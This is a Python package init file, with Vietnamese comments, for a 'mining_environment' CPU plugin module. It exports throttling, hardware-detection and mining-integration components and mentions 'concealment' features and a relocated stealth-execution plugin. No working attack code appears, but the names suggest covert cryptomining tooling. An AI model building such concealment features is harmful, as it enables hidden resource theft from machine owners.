"""cpu_plugins

Module quản lý CPU cho mining_environment, cung cấp các tính năng tối ưu hóa và che giấu.

Phiên bản: 1.0.0
"""
from __future__ import annotations

# Xuất các API cốt lõi
from .core import (
    ICpuTechnique,
    register_plugin,
    discover_plugins as discover_cpu_plugins,
    load_plugin_config,
)

# Xuất các plugin tối ưu hóa
from .optimization import CpuThrottlePlugin

# Stealth plugins moved to mining_environment.stealth module
# from .cloaking import StealthExecutionPlugin  # REMOVED

# Xuất các tiện ích
from .utils import (
    HardwareDetector,
    CPUInfo,
    GPUInfo,
    CPUVendor,
    GPUVendor,
    retry_with_backoff,
    BackoffStrategy,
)

# Xuất service cấu hình
from .config.inference_config import get_inference_config

__version__ = "1.0.0"

__all__ = [
    # Core
    'ICpuTechnique',
    'register_plugin',
    'discover_cpu_plugins',
    'load_plugin_config',
    
    # Plugins
    'CpuThrottlePlugin',
    # 'StealthExecutionPlugin',  # REMOVED - use mining_environment.stealth
    
    # Utils
    'HardwareDetector',
    'CPUInfo',
    'GPUInfo',
    'CPUVendor',
    'GPUVendor',
    'retry_with_backoff',
    'BackoffStrategy',
    
    # Config service
    'get_inference_config',
    
    # Version
    '__version__',
]
# OptimizedCalculationChain Integration
try:
    from .optimization.optimized_calculation_chain import OptimizedCalculationChain
    from .optimization.mining_integration_adapter import MiningIntegrationAdapter
    from .optimization.system_integration import OptimizedSystemIntegration
    OPTIMIZED_MINING_AVAILABLE = True
except ImportError:
    OPTIMIZED_MINING_AVAILABLE = False
